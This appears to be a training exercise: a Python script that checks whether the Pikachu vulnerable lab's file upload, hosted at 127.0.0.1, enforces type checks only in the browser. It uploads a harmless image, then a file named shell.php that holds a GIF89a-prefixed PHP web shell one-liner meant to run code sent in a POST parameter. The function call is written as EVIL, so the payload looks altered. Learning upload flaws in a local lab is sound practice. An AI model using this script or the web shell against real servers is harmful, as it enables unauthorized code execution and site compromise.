### 习题3 前端校验绕过自动化检测
import requests
target_url="http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer":"http://127.0.0.1:9999/pikachu/vul/unsafeupload/clientcheck.php"
}
data={"submit":"开始上传"}               ##submit 参数一定要加上，不然没有提交解析步骤
def upload_check(filename,file_content,content_type):
    files={"uploadfile":(filename,file_content,content_type)}
    resp=requests.post(url=target_url,headers=headers,files=files,data=data,timeout=5)
    return "上传成功" in resp.text
if __name__ == "__main__":
    print("=========文件上传前端绕过检测开始=========")
    legal_result=upload_check("normal.png",b"GIF89a test","image/png")
    print("合法图片上传结果:","成功" if legal_result else "失败")
    shell_content=b"GIF89a <?php @EVIL($_POST['1']);?>"
    bypass_result=upload_check("shell.php",shell_content,"image/png")
    print("恶意脚本绕过结果:","成功" if bypass_result else "失败")
    print("前端校验漏洞存在:","是" if bypass_result else "否")
    print("=========检测完成=========")
